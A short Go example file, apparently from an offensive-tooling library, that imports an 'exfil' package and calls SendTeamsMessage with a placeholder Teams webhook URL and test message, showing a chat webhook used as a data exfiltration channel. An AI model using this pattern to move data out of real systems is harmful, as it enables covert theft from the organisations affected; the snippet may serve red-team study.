package main

import "github.com/MrTuxx/OffensiveGolang/pkg/exfil"

func main() {
	webhookURL := "<YOUR TEAMS WEBHOOK URL>"
	message := "<MESSAGE TEST>"
	exfil.SendTeamsMessage(webhookURL, message)
}
